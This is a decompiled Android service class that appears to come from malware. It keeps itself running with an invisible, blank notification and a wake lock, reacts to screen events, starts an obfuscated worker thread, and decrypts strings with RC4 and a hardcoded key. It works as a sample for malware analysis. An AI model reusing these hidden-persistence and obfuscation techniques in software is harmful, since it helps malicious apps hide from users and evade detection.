/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.annotation.TargetApi
 *  android.app.Notification
 *  android.app.Notification$Builder
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.app.PendingIntent
 *  android.app.Service
 *  android.content.BroadcastReceiver
 *  android.content.Context
 *  android.content.Intent
 *  android.content.IntentFilter
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.IBinder
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.util.Base64
 */
package com.example.mmm.Service;

import android.annotation.TargetApi;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Service.srvAntiSleep$Receiver;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;
import com.example.mmm.mainActivity;
import com.example.mmm.unmapped.Willie;

public class srvAntiSleep
extends Service {
    utils utl = new utils();
    constants consts = new constants();
    private boolean bargain$ = false;
    private srvAntiSleep$Receiver length$;
    private PowerManager.WakeLock wakeLock = null;

    @TargetApi(value=16)
    @TargetApi(value=16)
    private Notification a() {
        NotificationManager notificationManager;
        int n2 = Build.VERSION.SDK_INT;
        String string = "ENDLESS";
        if (n2 >= 26) {
            notificationManager = (NotificationManager)this.getSystemService("notification");
            NotificationChannel notificationChannel = new NotificationChannel(string, (CharSequence)" ", 4);
            notificationChannel.setDescription("");
            notificationChannel.enableLights(true);
            notificationChannel.setLightColor(-1);
            notificationChannel.enableVibration(false);
            notificationManager.createNotificationChannel(notificationChannel);
        }
        notificationManager = PendingIntent.getActivity((Context)this, (int)0, (Intent)new Intent((Context)this, mainActivity.class), (int)0);
        if (Build.VERSION.SDK_INT >= 26) {
            string = new Notification.Builder((Context)this, string);
            return string.setContentTitle((CharSequence)"").setContentIntent((PendingIntent)notificationManager).setSmallIcon(2130837504).setPriority(-2).build();
        }
        string = new Notification.Builder((Context)this);
        return string.setContentTitle((CharSequence)"").setContentIntent((PendingIntent)notificationManager).setSmallIcon(2130837504).setPriority(-2).build();
    }

    static boolean a(srvAntiSleep srvAntiSleep2) {
        return srvAntiSleep2.bargain$;
    }

    public final String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    public IBinder onBind(Intent intent) {
        this.utl.Log("EndLess", "Some component want to bind with the service");
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.utl.Log("EndLess", "The service has been created".toUpperCase());
        this.length$ = new srvAntiSleep$Receiver(this, 0);
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("android.intent.action.SCREEN_OFF");
        intentFilter.addAction("android.intent.action.USER_PRESENT");
        this.registerReceiver((BroadcastReceiver)this.length$, intentFilter);
        this.startForeground(1, this.a());
    }

    public void onDestroy() {
        super.onDestroy();
        if (this.length$ != null) {
            this.unregisterReceiver((BroadcastReceiver)this.length$);
        }
        this.utl.Log("EndLess", "The service has been destroyed".toUpperCase());
    }

    public int onStartCommand(Intent intent, int n2, int n3) {
        utils utils3 = this.utl;
        String string = "EndLess";
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("onStartCommand executed with startId: ");
        stringBuilder.append(n3);
        utils3.Log(string, stringBuilder.toString());
        if (intent == null) return 1;
        if (intent.getAction().equals("start")) {
            if (this.bargain$) return 1;
            this.utl.Log("EndLess", "Starting the foreground service task");
            this.bargain$ = true;
            this.utl.SettingsWrite((Context)this, "EL", "start");
            if (this.wakeLock == null) {
                ((PowerManager)this.getSystemService("power")).newWakeLock(1, ((Object)((Object)this)).getClass().getName()).acquire();
            }
            new Thread(new Willie(this)).start();
            return 1;
        }
        this.utl.Log("EndLess", "Stopping the foreground service");
        if (this.wakeLock != null && this.wakeLock.isHeld()) {
            this.wakeLock.release();
        }
        this.stopForeground(true);
        this.stopSelf();
        this.bargain$ = false;
        this.utl.SettingsWrite((Context)this, "EL", "");
        return 1;
    }
}

